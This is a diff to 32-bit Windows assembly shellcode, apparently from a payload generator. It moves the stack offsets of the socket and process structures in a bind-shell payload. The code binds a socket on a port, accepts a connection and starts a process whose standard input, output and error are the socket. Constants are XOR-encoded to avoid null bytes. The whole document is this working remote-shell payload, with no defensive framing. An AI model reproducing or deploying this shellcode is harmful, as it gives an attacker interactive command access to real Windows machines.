@@ -225,14 +225,14 @@ main:
 
 ; -- Structure Initialization --
 
-; --- WSADATA at [ebp-0x210] (0x190 bytes) ---
-; No initialization needed - WSAStartup writes output to [ebp-0x210].
+; --- WSADATA at [ebp-0x290] (0x190 bytes) ---
+; No initialization needed - WSAStartup writes output to [ebp-0x290].
 
-; --- sockaddr_in at [ebp-0x220] (0x10 bytes) ---
+; --- sockaddr_in at [ebp-0x2a0] (0x10 bytes) ---
 ; sin_port and sin_addr are set by the payload template.
 
     xor  eax, eax
-    lea  edi, [ebp-0x220]
+    lea  edi, [ebp-0x2a0]
     mov  [edi], eax
     mov  [edi+0x04], eax
     mov  [edi+0x08], eax
@@ -243,10 +243,10 @@ main:
 
     ; Template sets sin_port (+0x02) and sin_addr (+0x04) before connect()
 
-; --- STARTUPINFOA at [ebp-0x264] (0x44 bytes) ---
+; --- STARTUPINFOA at [ebp-0x2e4] (0x44 bytes) ---
 
     xor  eax, eax
-    lea  edi, [ebp-0x264]
+    lea  edi, [ebp-0x2e4]
 
     ; zero 0x44 bytes (17 DWORDs)
     xor  ecx, ecx
@@ -256,7 +256,7 @@ startupinfoa_zero_loop:
     add  edi, 4
     loop startupinfoa_zero_loop
 
-    lea  edi, [ebp-0x264]
+    lea  edi, [ebp-0x2e4]
     mov  byte ptr [edi], 0x44
 
     inc  eax                       ; eax was 0 from zeroing loop
@@ -265,10 +265,10 @@ startupinfoa_zero_loop:
 
     ; hStdInput/hStdOutput/hStdError set by payload after socket creation
 
-; --- PROCESS_INFORMATION at [ebp-0x274] (0x10 bytes) ---
+; --- PROCESS_INFORMATION at [ebp-0x2f4] (0x10 bytes) ---
 
     xor  eax, eax
-    lea  edi, [ebp-0x274]
+    lea  edi, [ebp-0x2f4]
     mov  [edi], eax
     mov  [edi+0x04], eax
     mov  [edi+0x08], eax
@@ -305,7 +305,7 @@ wf_entry:
     ; const inaddr_any = 0x0
 
     ; WSAStartup(wVersionRequested, lpWSAData)
-    lea  eax, [ebp-0x210]
+    lea  eax, [ebp-0x290]
     push eax                      ; lpWSAData
     mov  eax, 0x01010303
     xor  eax, 0x01010101
@@ -348,7 +348,7 @@ wf_create_socket:
 wf_bind_socket:
     ; zero sa (sockaddr_in, 0x10 bytes)
     xor  eax, eax
-    lea  edi, [ebp-0x220]
+    lea  edi, [ebp-0x2a0]
     mov  [edi], eax
     mov  [edi+0x04], eax
     mov  [edi+0x08], eax
@@ -356,20 +356,20 @@ wf_bind_socket:
     ; sa.sin_family
     mov  eax, 0x01010103
     xor  eax, 0x01010101
-    mov  word ptr [ebp-0x220], ax
+    mov  word ptr [ebp-0x2a0], ax
     ; sa.sin_port
     mov  eax, 0x01015d10
     xor  eax, 0x01010101
-    mov  word ptr [ebp-0x21e], ax
+    mov  word ptr [ebp-0x29e], ax
     ; sa.sin_addr
     xor  eax, eax
-    mov  [ebp-0x21c], eax
+    mov  [ebp-0x29c], eax
 
     ; bind(s, addr, namelen)
     mov  eax, 0x01010111
     xor  eax, 0x01010101
     push eax                      ; namelen
-    lea  eax, [ebp-0x220]
+    lea  eax, [ebp-0x2a0]
     push eax                      ; addr
     mov  eax, [ebp-0x4c]
     push eax                      ; s
@@ -418,7 +418,7 @@ wf_accept_conn:
 wf_setup_process:
     ; zero si (STARTUPINFOA, 0x44 bytes)
     xor  eax, eax
-    lea  edi, [ebp-0x264]
+    lea  edi, [ebp-0x2e4]
     xor  ecx, ecx
     mov  cl, 0x11
 wf_zero_si:
@@ -428,32 +428,32 @@ wf_zero_si:
     ; si.cb
     mov  eax, 0x01010145
     xor  eax, 0x01010101
-    mov  [ebp-0x264], eax
+    mov  [ebp-0x2e4], eax
     ; si.dwFlags
     mov  eax, 0x01010301
     xor  eax, 0x01010201
-    mov  [ebp-0x238], eax
+    mov  [ebp-0x2b8], eax
     ; si.hStdInput
     mov  eax, [ebp-0x58]
-    mov  [ebp-0x22c], eax
+    mov  [ebp-0x2ac], eax
     ; si.hStdOutput
     mov  eax, [ebp-0x58]
-    mov  [ebp-0x228], eax
+    mov  [ebp-0x2a8], eax
     ; si.hStdError
     mov  eax, [ebp-0x58]
-    mov  [ebp-0x224], eax
+    mov  [ebp-0x2a4], eax
     ; zero pi (PROCESS_INFORMATION, 0x10 bytes)
     xor  eax, eax
-    lea  edi, [ebp-0x274]
+    lea  edi, [ebp-0x2f4]
     mov  [edi], eax
     mov  [edi+0x04], eax
     mov  [edi+0x08], eax
     mov  [edi+0x0c], eax
 
     ; CreateProcessA(lpApplicationName, lpCommandLine, lpProcessAttributes, lpThreadAttributes, bInheritHandles, dwCreationFlags, lpEnvironment, lpCurrentDirectory, lpStartupInfo, lpProcessInformation)
-    lea  eax, [ebp-0x274]
+    lea  eax, [ebp-0x2f4]
     push eax                      ; lpProcessInformation
-    lea  eax, [ebp-0x264]
+    lea  eax, [ebp-0x2e4]
     push eax                      ; lpStartupInfo
     xor  eax, eax
     push eax                      ; lpCurrentDirectory
@@ -468,7 +468,7 @@ wf_zero_si:
     push eax                      ; lpThreadAttributes
     xor  eax, eax
     push eax                      ; lpProcessAttributes
-    lea  eax, [ebp-0x27c]
+    lea  eax, [ebp-0x2fc]
     push eax                      ; lpCommandLine
     xor  eax, eax
     push eax                      ; lpApplicationName
